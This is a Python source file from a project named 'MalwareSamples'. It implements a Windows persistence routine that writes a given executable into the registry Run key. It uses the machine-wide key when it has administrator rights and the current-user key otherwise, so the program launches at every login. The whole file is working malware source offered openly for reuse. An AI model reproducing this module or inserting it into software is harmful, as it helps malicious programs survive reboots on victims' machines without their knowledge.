"""
   Copyright (c) 2019 Jack Farley
   This file is part of MalwareSamples
   Usage or distribution of this software/code is subject to the
   terms of the GNU GENERAL PUBLIC LICENSE.
   registry.py
   ---
"""


from winreg import *
from helpers.utilities import has_admin





def software_Microsoft_Windows_CurrentVersion_Run(process_path, process_name):
    """

    :param process_path: Path to executable that is going to be used in persistence
    :param process_name: Name of the process to be used. This will show up in registry
    :return:
    """
    privs = has_admin()

    """Use HKLM run key if we have the priviledge to do so"""
    if privs[1] is True:
        reg_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        registry_key = OpenKey(HKEY_LOCAL_MACHINE, reg_path, 0, KEY_WRITE)
        install = process_path.replace("/", "\\")
        SetValueEx(registry_key, process_name, 0, REG_SZ, install)
        CloseKey(registry_key)


    else:
        """Set to current user run key"""
        reg_path = "Software\Microsoft\Windows\CurrentVersion\Run"
        registry_key = OpenKey(HKEY_CURRENT_USER, reg_path, 0, KEY_WRITE)
        install = process_path.replace("/", "\\")
        SetValueEx(registry_key, process_name, 0, REG_SZ, install)
        CloseKey(registry_key)